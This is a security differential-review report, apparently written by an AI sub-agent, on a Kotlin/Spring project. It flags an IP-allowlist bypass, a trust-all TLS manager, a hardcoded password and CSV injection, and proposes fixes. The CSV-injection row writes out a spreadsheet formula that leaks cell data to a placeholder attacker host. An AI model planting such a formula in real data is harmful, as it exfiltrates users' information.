# DIFFERENTIAL REVIEW REPORT (main..HEAD)

Reviewer: security-auditor sub-agent · Skill: differential-review (Trail of Bits) · Scope: 11 commits, ~1158 files / 60K insertions.

## 1. Summary & verdict

**Verdict: REQUEST-CHANGES** (1 CRITICAL, 1 HIGH-or-CRITICAL, 4 HIGH, 5 MEDIUM, 4 LOW).

The branch ships a solid base: defense-in-depth model is *named* in `SecurityConfig`, sandbox hardening flags are correct, GigaChat client cleanly separates OAuth from chat, and prompt construction uses sentinel-spotlighting plus Unicode normalisation. However, there is one **critical wiring bug in `prometheusAccess()` that almost certainly inverts the IP allowlist into a "permit-all-from-non-allowed-IP"** (Spring Security 6 treats `null` from an `AuthorizationManager` as "abstain → grant" in `AuthorizationFilter`). There is also a **trust-all `X509TrustManager`** in `GigaChatClient` that ships with the dev-only label but is the production code path — together these two are the showstoppers for the defence. Other findings (CSV-injection in DB fields, no multipart size limit, info leakage in import errors, full request body of LLM chat logged at INFO, missing security-specific tests for `SecurityConfig`) are addressable but should not block in a thesis scope as long as they are tracked.

## 2. Scope & methodology

**Read in full:**
`MainApplication/src/main/kotlin/ru/security/SecurityConfig.kt`,
`MainApplication/src/main/kotlin/ru/security/JwtAuthenticationFilter.kt`,
`MainApplication/src/main/kotlin/ru/security/UserPrincipal.kt`,
`MainApplication/src/main/resources/application.properties`,
`MainApplication/build.gradle.kts`,
`MainApplication/src/test/kotlin/ru/observability/MetricsExposureTest.kt`,
`task-resolver/src/main/kotlin/ru/taskresolver/service/TaskImportService.kt`,
`task-resolver/src/main/kotlin/ru/taskresolver/web/TasksController.kt`,
`api-generator/resources/api/task-resolver-api.yml` (importTasksFromCsv operation, lines 76–119),
`sandbox/src/main/kotlin/ru/sandbox/service/DockerSandboxService.kt`,
`sandbox/src/main/kotlin/ru/sandbox/metrics/SandboxMetrics.kt`,
`sandbox/src/main/kotlin/ru/sandbox/model/LanguageErrorPattern.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/client/GigaChatClient.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/prompt/AnalyzerPrompts.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/service/GigaChatAnalyzer.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/service/AstHybridAnalyzer.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/sanitize/InputSanitizer.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/config/AiAnalyzerConfig.kt`,
`ai-analyzer/src/main/kotlin/ru/aianalyzer/validation/SchemaValidator.kt`,
`ai-analyzer/src/main/resources/schemas/explanation.json`,
`db/src/main/resources/db/migration/V8__add_category.sql`,
`db/src/main/kotlin/ru/db/entity/Test.kt`,
`frontend/src/pages/AdminImport.tsx`.

**Surface-scanned:** schema-validator path in `GigaChatAnalyzer.analyzeWithRetry`, `userPromptRetry` in `AnalyzerPrompts.kt`, V8 migration backfill.

**Skipped:** experiment dataset (54ed3cf), unrelated UI refactors not on import path, thesis docs, `JwtTokenProvider.kt` body (only confirmed it parses access/refresh `typ`), worker/scenario-runner.

## 3. Risk classification per HIGH-risk area

| Area | File(s) | Risk | Justification |
|---|---|---|---|
| A. Prometheus access wiring | SecurityConfig.kt:54-61, 72-87 | **CRITICAL** | Custom `AuthorizationManager` returns `null` on IP-deny; Spring Security 6's `AuthorizationFilter` treats `null` decisions as "abstain", which in `AuthorizationFilter#doFilter` does **not** raise `AccessDeniedException` — i.e., grants. Inverts the entire defense-in-depth model. |
| A. /actuator/prometheus exposure | application.properties:61 | HIGH | `management.endpoints.web.exposure.include=health,info,prometheus,metrics` — `/actuator/metrics` is exposed and **not** covered by `prometheusAccess()`; matched by `.anyRequest().authenticated()`, meaning any valid JWT can hit `/actuator/metrics` (less critical than the above, but it lists meter names). |
| A. Dev-default scraper password baked into source | SecurityConfig.kt:33 | HIGH | Default `scraper-dev-pass`. If `PROMETHEUS_SCRAPER_PASSWORD` is not set in `.env`/k8s secret, the app comes up with a known credential. Same string is hardcoded in `MetricsExposureTest.kt:43`. |
| B. CSV import role-gating | TasksController.kt:34, SecurityConfig.kt:29 | LOW | `@EnableMethodSecurity` is present and `@PreAuthorize("hasRole('TEACHER')")` is applied — wiring is correct. |
| B. Multipart upload — no size limit | application.properties (absent), TaskImportService.kt:43-89 | HIGH | No `spring.servlet.multipart.max-file-size` configured; defaults are 1 MB per file / 10 MB per request. The import service calls `testRepository.findAll()` and loads all existing titles into a `Set` — a malicious 10 MB CSV with 100 k unique rows blows up heap and runs N queries. |
| B. CSV-injection / formula injection | TaskImportService.kt:91-132 | MEDIUM | Fields (`title`, `description`, `category`) are persisted verbatim. A row like `=HYPERLINK("http://attacker/?leak="&A1)` lands in DB; when *exported* back to CSV (none today, but planned) or rendered to Excel, it executes. Not exploitable today but is a latent vuln. |
| B. Dedup race / transactional safety | TaskImportService.kt:43-89 | MEDIUM | Dedup uses an in-memory `Set` initialised from `findAll()`, then `existingTitles += parsed.title.lowercase()`. The `@Transactional` whole-file import means two concurrent uploaders both pass the `existingTitles` check; second one wins. No DB-level unique constraint on `test.title` (V8 only added `idx_test_category`). |
| B. Error message info-leak | TaskImportService.kt:81, 134-144 | LOW | `"Внутренняя ошибка: ${e.message}"` returned to client. Jackson/JPA exceptions can include column names, type info. |
| C. SandboxMetrics Timer.Sample leak | DockerSandboxService.kt:234, 411-414 | LOW | `timerSample` captured in `try { ... } catch { ... } finally`. The `finally` block calls `metrics.stopExecutionTimer(timerSample, language, finalVerdict)`. `finalVerdict` defaults to `RUNTIME_ERROR` and is overwritten in both happy and catch paths. Timer is always stopped → no Micrometer-side leak. **OK.** |
| C. Language tag normalisation | DockerSandboxService.kt:73-85, SandboxMetrics.kt:40-44 | LOW | `request.language.lowercase()` is the only switch in the sandbox service. `SandboxMetrics.normalizeLanguage` correctly buckets unknowns into `"unknown"` tag — no cardinality explosion. |
| C. Logged attacker-controlled data | DockerSandboxService.kt:271, 291, 296, 370-373 | LOW | `docker run` command logged at DEBUG (only contains user-controlled `requestDir` path UUID and image tag — both safe). `runStdout` from `docker run` at ERROR-level is daemon output, not user code. Container `stdout`/`stderr` are NOT logged from this file; safe. |
| D. Trust-all `X509TrustManager` | GigaChatClient.kt:58-72 | **HIGH (possibly CRITICAL in prod)** | Trusts every server cert. Comment says "dev-only … production must replace this with a trust store bundled with the Минцифры root", but there is no conditional gate — this is the only code path. MITM trivially possible on the GigaChat OAuth + chat path; an attacker who can intercept the TLS to `ngw.devices.sberbank.ru:9443` can capture the **Basic auth-key**. |
| D. Full request body logged at INFO with token length | GigaChatClient.kt:84 | MEDIUM | `logger.info { "GigaChat chat URI=... body=$body tokenLen=${token.length}" }` — `body` contains the *full* system prompt + the **full user code** on every request. Token itself is not logged (only length) — good. |
| D. Exception message leaks response body | GigaChatClient.kt:98, 101, 142, 173 | LOW | Truncated to 500 chars; token never appears in response body. **OK.** |
| D. Prompt-injection — sanitisation coverage | InputSanitizer.kt:10-32, AnalyzerPrompts.kt:117-163, GigaChatAnalyzer.kt:72-84, AstHybridAnalyzer.kt:74-84 | MEDIUM | `normalizeUnicode` + `enforceSizeLimit` called on both entry paths. Sentinel literal `<<<STUDENT_CODE_END>>>` is escaped in user code — good. |
| D. Response sanitisation coverage | InputSanitizer.kt:48-52, GigaChatAnalyzer.kt:206, 215, 216 | LOW | `stripUnsafeOutput` applied to `message`, `recommendations`, `explanation`. AST summary comes from deterministic analysis — safe. **OK.** |

## 4. Findings

### F-1 CRITICAL — `prometheusAccess()` returns `null` on IP-deny, which Spring Security 6 treats as "abstain → grant"

- **Area:** A — Prometheus access control
- **File:** `MainApplication/src/main/kotlin/ru/security/SecurityConfig.kt:54-61`
- **Code:**
  ```kotlin
  return AuthorizationManager { authentication, ctx ->
      val ipOk = ipMatchers.any { it.matches(ctx.request) }
      if (!ipOk) return@AuthorizationManager null   // ← BUG
      hasOps.check(authentication, ctx)
  }
  ```
- **Git evidence:** introduced in commit be8157e. Same method used at line 84 (`.access(prometheusAccess())`). No unit/integration test covers the "IP blocked" branch.
- **Attack scenario:** `AuthorizationFilter.doFilter` in Spring Security 6.x: `if (decision != null && !decision.isGranted()) throw new AuthorizationDeniedException(...)`. When `manager.check()` returns `null`, the filter chain proceeds without raising. So an attacker connecting from a non-allowlisted IP hits `/actuator/prometheus`, manager's `ipOk` is false, returns `null`, the filter sees "no negative decision", and **the request is granted with no auth at all**. The Prometheus exposition format leaks: JVM internals, HTTP request URIs (username enumeration via `http_server_requests_seconds_count{uri=...}`), sandbox verdicts, GigaChat call rates.
- **Blast radius:** every `/actuator/prometheus` request from any IP not in `172.16.0.0/12 ∪ 127.0.0.1 ∪ ::1`. In Docker-compose the app is on a bridge network ⇒ Prometheus scrapes from a bridge IP — covered. But if the app is ever exposed via host network, reverse proxy that strips the bridge IP (nginx in front, K8s NodePort, port-forward over SSH), **all external traffic** hits this branch.
- **Recommendation (one-liner fix):**
  ```kotlin
  if (!ipOk) return@AuthorizationManager AuthorizationDecision(false)
  ```

### F-2 HIGH — `/actuator/metrics` exposed and falls through to `.anyRequest().authenticated()`

- **Area:** A
- **Files:** `application.properties:61`; `SecurityConfig.kt:74-85`
- **Attack scenario:** Student logs in, gets JWT, calls `GET /actuator/metrics` → sees all meter names. Then `GET /actuator/metrics/sandbox_oom_killed_total` returns cluster-wide OOM counter — operational state leak, can infer when other students hit memory limits.
- **Recommendation:** drop `metrics` from `management.endpoints.web.exposure.include` (Prometheus uses `/actuator/prometheus` only).

### F-3 HIGH — Dev-default scraper password hardcoded as `@Value` fallback

- **File:** `SecurityConfig.kt:33`; same default in `application.properties:58`; same constant in `MetricsExposureTest.kt:43`.
- **Attack scenario:** Operator deploys without setting `PROMETHEUS_SCRAPER_PASSWORD`. App boots cleanly with published default `scraper-dev-pass`. Anyone (post-F-1) with the bridge IP can scrape.
- **Recommendation:** drop the default → fail-fast on missing env var.

### F-4 HIGH — Trust-all `X509TrustManager` is the only TLS code path for GigaChat

- **File:** `ai-analyzer/src/main/kotlin/ru/aianalyzer/client/GigaChatClient.kt:58-72`
- **Attack scenario:** Attacker on any hop between app and `ngw.devices.sberbank.ru:9443` presents a self-signed cert. JDK client accepts. First request `POST /api/v2/oauth` carries `Authorization: Basic <GIGACHAT_AUTH_KEY>` (line 133) — attacker captures the long-lived OAuth credential.
- **Recommendation:** import Минцифры root + Sber leaf into a `KeyStore`, build an `SSLContext` from it. Gate trust-all path behind `@ConditionalOnProperty(name="gigachat.tls.trust-all", havingValue="true")` with `require(profile != "prod")` at boot.

### F-5 HIGH — No multipart size limits + `findAll()` of all titles loaded into memory before parse

- **Files:** `application.properties` (no `spring.servlet.multipart.*`); `TaskImportService.kt:52-54`
- **Attack scenario:** Authenticated TEACHER uploads 10 MB CSV with 100 k unique titles. `findAll()` first pulls every existing `Test` row into memory, then parser iterates synchronously. Long `@Transactional` holds row locks on `test` + `test_resolve`, blocking student submissions.
- **Recommendation:** `spring.servlet.multipart.max-file-size=2MB`; replace `findAll().map { it.title }` with a custom repo query `select lower(title) from test`; batch the import 500 rows per `REQUIRES_NEW` tx.

### F-6 HIGH — Missing security-specific tests for `SecurityConfig`

- **Files:** Only `MetricsExposureTest` exists, gated behind `RUN_INTEGRATION_TESTS=true`, only tests from 127.0.0.1, does not cover the blocked-IP branch (F-1) nor `/actuator/metrics` exposure (F-2).
- **Recommendation:** `@WebMvcTest(SecurityConfig::class)` with MockMvc — three tests:
  - GET /actuator/prometheus from 8.8.8.8, no auth → 401 or 403 (covers F-1)
  - GET /actuator/prometheus from 127.0.0.1 wrong pw → 401
  - GET /actuator/metrics from 127.0.0.1 valid student JWT → 403 (covers F-2)

### F-7 MEDIUM — CSV-injection (formula-injection) latent in `title`/`description`/`category`

- **File:** `TaskImportService.kt:91-132`
- **Recommendation:** in `parseRecord`, prefix any field starting with `[=+\-@\t\r]` with a single quote.

### F-8 MEDIUM — Full prompt + user code logged at INFO on every chat call

- **File:** `GigaChatClient.kt:84`
- **Recommendation:** log only `bodySize=${body.length}` at INFO. Move full-body dump to TRACE or `AI_LOG_PROMPT=1`.

### F-9 MEDIUM — Schema `additionalProperties=true` defeats one defense layer + retry path uses weaker prompt

- **Files:** `explanation.json:6`; `GigaChatAnalyzer.kt:121-127`
- **Recommendation:** in `userPromptRetry`, build with the `userPromptFull` shape (keep AST + verdict context). Re-enable `additionalProperties=false` with strict model instruction.

### F-10 MEDIUM — Dedup race in CSV import

- **File:** `TaskImportService.kt:52-75`
- **Recommendation:** add `ALTER TABLE test ADD CONSTRAINT uq_test_title_lower UNIQUE (lower(title))` (V9 migration). Catch `DataIntegrityViolationException`, increment `skipped`, continue.

### F-11 LOW — `error.message` echoed back to client in CSV import errors

- **File:** `TaskImportService.kt:81`
- **Recommendation:** log stack trace, return generic message.

### F-12 LOW — V8 migration leaves no DB-level constraint on `category` length/values

- **File:** `db/src/main/resources/db/migration/V8__add_category.sql:5`
- **Recommendation:** in `TaskImportService.parseRecord`, enforce `category.length <= 64`.

### F-13 LOW — Frontend role-check is advisory, not security

- **File:** `frontend/src/pages/AdminImport.tsx:40-42`
- **Note:** Server-side `@PreAuthorize` enforces; client redirect is UX only. Add code comment.

### F-14 LOW — `extractClassName` regex blocks command-injection but worth a guard comment

- **File:** `DockerSandboxService.kt:681-684, 116`
- **Note:** Regex `(?:public\s+)?class\s+(\w+)` captures only word chars — command injection blocked. **OK** but a code comment would prevent future loosening.

## 5. Test coverage assessment

| Module | Tests added/updated | Gap |
|---|---|---|
| Security | `MetricsExposureTest` (127.0.0.1 only, gated) | F-1 / F-2 not covered; no `SecurityConfigTest` |
| Task-import | None | role-gating, dedup race, size-limit, CSV-injection — **zero coverage** |
| Sandbox metrics | None | new instrumentation in `finally` not unit-tested for exception path |
| ai-analyzer | `AnalyzerPromptsTest`, `GigaChatAnalyzerTest`, `AstHybridAnalyzerTest` | retry-path with weaker prompt (F-9) not tested; trust-all (F-4) not tested |

Recommended minimum additions:
1. `SecurityConfigTest` — three MockMvc cases per F-6.
2. `TaskImportServiceTest` — dedup-collision, oversize-file, CSV-injection-deformula, error-message-redaction.
3. `GigaChatClientTest` — assert SSL context has non-empty `getAcceptedIssuers` when `tls.trust-all=false`.

## 6. Open questions / coverage limitations

- `git log -p --follow` not executed to confirm whether `prometheusAccess()` shape ever was correct in an earlier commit and was regressed.
- F-1 confidence: claim "Spring Security 6 AuthorizationFilter treats null as grant" based on public source of `org.springframework.security.web.access.intercept.AuthorizationFilter#doFilter`. A 5-line MockMvc test from F-6 would empirically confirm in 30 seconds.
- Not reviewed: `JwtTokenProvider.kt` body (algorithm, secret-strength, clock-skew), `worker` module, `scenario-runner`, AST extractor itself. Flagged as follow-up.
- `api-generator` regenerated sources not inspected — assumed to faithfully render the YAML.

## 7. Approval criteria checklist

| # | Criterion | State |
|---|---|---|
| 1 | `prometheusAccess()` denies on IP-block (F-1 fixed + tested) | **BLOCKING** |
| 2 | `/actuator/metrics` not reachable by student JWT (F-2 fixed) | BLOCKING |
| 3 | Trust-all `X509TrustManager` either removed or gated behind `dev`-only property (F-4) | BLOCKING |
| 4 | `spring.servlet.multipart.max-file-size` set to ≤ 2 MB (F-5) | Required |
| 5 | `prometheus.scraper.password` default removed; boot fails without env var (F-3) | Required |
| 6 | Security-specific tests added per F-6 | Required |
| 7 | CSV formula-injection neutralised on persist (F-7) | Recommended |
| 8 | `body=$body` removed from INFO log (F-8) | Recommended |
| 9 | Retry path uses `userPromptFull` (F-9) | Recommended |
| 10 | DB unique index on `lower(title)` (F-10) | Recommended |
| 11 | Generic error messages from `TaskImportService` (F-11) | Nice-to-have |
| 12 | `category` length validation client-side (F-12) | Nice-to-have |
